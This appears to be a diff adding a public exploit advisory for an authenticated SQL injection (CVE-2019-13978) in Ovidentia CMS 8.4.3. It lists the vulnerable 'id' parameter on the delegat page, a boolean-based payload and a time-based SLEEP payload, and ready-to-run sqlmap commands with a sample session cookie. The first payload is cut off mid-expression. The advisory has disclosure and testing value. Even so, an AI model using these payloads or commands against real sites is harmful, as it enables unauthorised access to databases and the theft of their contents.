@@ -1,0 +1,37 @@
+#-------------------------------------------------------
+# Exploit Title: [ Ovidentia CMS - SQL Injection (Authenticated) ]
+# Date: [ 06/05/2019 ]
+# CVE: [ CVE-2019-13978 ]
+# Exploit Author:
+# [ Fernando Pinheiro (n3k00n3) ]
+# [ Victor Flores (UserX) ]
+# Vendor Homepage: [
+https://www.ovidentia.org/
+]
+# Version: [ 8.4.3 ]
+# Tested on: [ Mac,linux - Firefox, safari ]
+# Download [
+http://en.ovidentia.org/index.php?tg=fileman&sAction=getFile&id=17&gr=Y&path=Downloads%2FDistributions&file=ovidentia-8-4-3.zip&idf=893
+]
+#
+#           [ Kitsun3Sec Research Group ]
+#--------------------------------------------------------
+
+POC
+
+Path: /ovidentia/index.php?tg=delegat&idx=mem&id=1
+Type: GET
+Vulnerable Field: id
+Payload:
+		1. tg=delegat&idx=mem&id=1 AND 3152=(SELECT (CASE WHEN (3152=3152) THEN 3152 ELSE (SELECT 9962 UNION SELECT
+		2. tg=delegat&idx=mem&id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))QwTg)
+
+URL:
+https://target/ovidentia/index.php?tg=delegat&idx=mem&id=1
+Using Request file
+sqlmap.py -r req --random-agent --risk 3 --level 5 --dbms=mysql -p id --dbs
+
+Using Get
+./sqlmap.py -u
+[http://target/ovidentia/index.php\?tg\=delegat\&idx\=mem\&id\=1](http://target/ovidentia/index.php/?tg\=delegat\&idx\=mem\&id\=1)
+--cookie "Cookie: OV1364928461=6kb5jvu7f6lg93qlo3vl9111f8" --random-agent --risk 3 --level 5 --dbms=mysql -p id --dbs
